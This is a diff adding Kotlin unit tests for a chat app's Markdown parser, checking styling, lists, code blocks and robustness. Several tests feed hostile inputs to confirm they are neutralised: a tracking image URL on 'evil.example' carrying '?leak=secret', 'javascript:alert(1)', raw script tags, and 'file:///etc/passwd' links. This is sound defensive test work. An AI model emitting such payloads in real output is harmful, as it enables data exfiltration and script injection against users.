@@ -1,0 +1,101 @@
+package tech.hybriq.adbuddy.chat
+
+import org.junit.Assert.assertEquals
+import org.junit.Assert.assertFalse
+import org.junit.Assert.assertTrue
+import org.junit.Test
+
+class MarkdownTest {
+    private fun p(vararg i: Inline) = Block.Paragraph(i.toList())
+
+    @Test fun plainTextIsOneParagraph() {
+        assertEquals(listOf(p(Inline.Text("Hola\nmundo"))), Markdown.parse("Hola\nmundo"))
+        assertEquals(listOf(p(Inline.Text("a")), p(Inline.Text("b"))), Markdown.parse("a\n\nb"))
+        assertEquals(emptyList<Block>(), Markdown.parse(""))
+        assertEquals(listOf(p(Inline.Text("a")), p(Inline.Text("b"))), Markdown.parse("a\r\n\r\nb"))
+    }
+
+    @Test fun inlineStyles() {
+        assertEquals(
+            listOf(p(Inline.Text("a "), Inline.Strong("fuerte"), Inline.Text(", "), Inline.Em("cursiva"), Inline.Text(" y "), Inline.Code("código"))),
+            Markdown.parse("a **fuerte**, *cursiva* y `código`"),
+        )
+        assertEquals(listOf(p(Inline.Em("uno"))), Markdown.parse("_uno_"))
+    }
+
+    @Test fun lonelyMarksAreText() {
+        for (t in listOf("2 * 3 * 4", "snake_case_name", "a * b", "**", "``", "`", "_", "*", "**no cierra", "[x](", "[x]", "5 ** 2")) {
+            val flat = Markdown.parse(t).flatMap { (it as Block.Paragraph).inlines }
+            assertTrue("$t -> $flat", flat.all { it is Inline.Text })
+            assertEquals(t, flat.joinToString("") { (it as Inline.Text).text })
+        }
+    }
+
+    @Test fun webLinksKeepTheirDomainCheckable() {
+        val b = Markdown.parse("ver [la web](https://example.com/a?b=1) ya")
+        assertEquals(listOf(p(Inline.Text("ver "), Inline.Link("la web", "https://example.com/a?b=1"), Inline.Text(" ya"))), b)
+        assertEquals("example.com", Links.domain((Markdown.parse("[x](http://Example.com)")[0] as Block.Paragraph).inlines[0].let { (it as Inline.Link).url }))
+    }
+
+    @Test fun onlyHttpLinksAreLinks() {
+        for (url in listOf("intent://x#Intent;end", "file:///etc/passwd", "content://x", "data:text/html,x", "tel:112", "ftp://x.org", "//evil.com", "mailto:a@b.c")) {
+            val flat = Markdown.parse("[pulsa]($url)").flatMap { (it as Block.Paragraph).inlines }
+            assertFalse("$url became a link", flat.any { it is Inline.Link })
+            assertEquals("the label stays, the url is dropped", "pulsa", flat.joinToString("") { (it as Inline.Text).text })
+        }
+        // A url with parentheses is not a link at all (it stays as the text it was, not clickable).
+        val js = Markdown.parse("[pulsa](javascript:alert(1))").flatMap { (it as Block.Paragraph).inlines }
+        assertFalse(js.any { it is Inline.Link })
+    }
+
+    @Test fun imagesAreOnlyTheirAltTextAndTheUrlIsNeverALink() {
+        val b = Markdown.parse("![gráfico](https://evil.example/pixel.png?leak=secret) y ![](https://evil.example/x.png)")
+        val flat = b.flatMap { (it as Block.Paragraph).inlines }
+        assertTrue(flat.all { it is Inline.Text })
+        val text = flat.joinToString("") { (it as Inline.Text).text }
+        assertFalse(text.contains("evil.example"))
+        assertTrue(text.startsWith("gráfico y "))
+    }
+
+    @Test fun htmlIsNotHtml() {
+        val raw = "<img src=\"https://evil.example/p.png\"> <script>alert(1)</script> <b>x</b> <a href=\"https://x.org\">y</a>"
+        val flat = Markdown.parse(raw).flatMap { (it as Block.Paragraph).inlines }
+        assertEquals(listOf<Inline>(Inline.Text(raw)), flat)
+    }
+
+    @Test fun headingsListsAndQuotes() {
+        val b = Markdown.parse("# Título\n## Sub\n- uno\n- dos con **negrita**\n  - anidado\n1. primero\n2) segundo\n> cita")
+        assertEquals(Block.Heading(1, listOf(Inline.Text("Título"))), b[0])
+        assertEquals(Block.Heading(2, listOf(Inline.Text("Sub"))), b[1])
+        assertEquals(Block.Item("•", 0, listOf(Inline.Text("uno"))), b[2])
+        assertEquals(Block.Item("•", 0, listOf(Inline.Text("dos con "), Inline.Strong("negrita"))), b[3])
+        assertEquals(Block.Item("•", 1, listOf(Inline.Text("anidado"))), b[4])
+        assertEquals(Block.Item("1.", 0, listOf(Inline.Text("primero"))), b[5])
+        assertEquals(Block.Item("2)", 0, listOf(Inline.Text("segundo"))), b[6])
+        assertEquals(Block.Quote(listOf(Inline.Text("cita"))), b[7])
+        assertEquals(8, b.size)
+    }
+
+    @Test fun codeBlocksAreVerbatim() {
+        val b = Markdown.parse("antes\n```kotlin\nval a = **no** [x](https://a.com)\n\n# no\n```\ndespués")
+        assertEquals(p(Inline.Text("antes")), b[0])
+        assertEquals(Block.CodeBlock("kotlin", "val a = **no** [x](https://a.com)\n\n# no"), b[1])
+        assertEquals(p(Inline.Text("después")), b[2])
+        assertEquals(listOf<Block>(Block.CodeBlock("", "sin cierre\nsigue")), Markdown.parse("```\nsin cierre\nsigue"))
+    }
+
+    @Test fun neverThrowsAndIsBounded() {
+        val hostile = listOf(
+            "*".repeat(50_000), "[".repeat(50_000), "[a](".repeat(20_000), "`".repeat(50_000), "_a_".repeat(30_000), "**a** ".repeat(20_000),
+            "#".repeat(50_000), "> ".repeat(50_000), "- ".repeat(50_000), "```\n".repeat(30_000), "\u0000￿\uD800", "a\n".repeat(200_000),
+        )
+        for (h in hostile) {
+            val b = Markdown.parse(h)
+            assertTrue(b.size <= Markdown.MAX_BLOCKS)
+        }
+        val big = Markdown.parse("x".repeat(Markdown.MAX_INPUT * 3))
+        val text = ((big[0] as Block.Paragraph).inlines[0] as Inline.Text).text
+        assertEquals(Markdown.MAX_INPUT + 1, text.length)
+        assertTrue(text.endsWith("…"))
+    }
+}
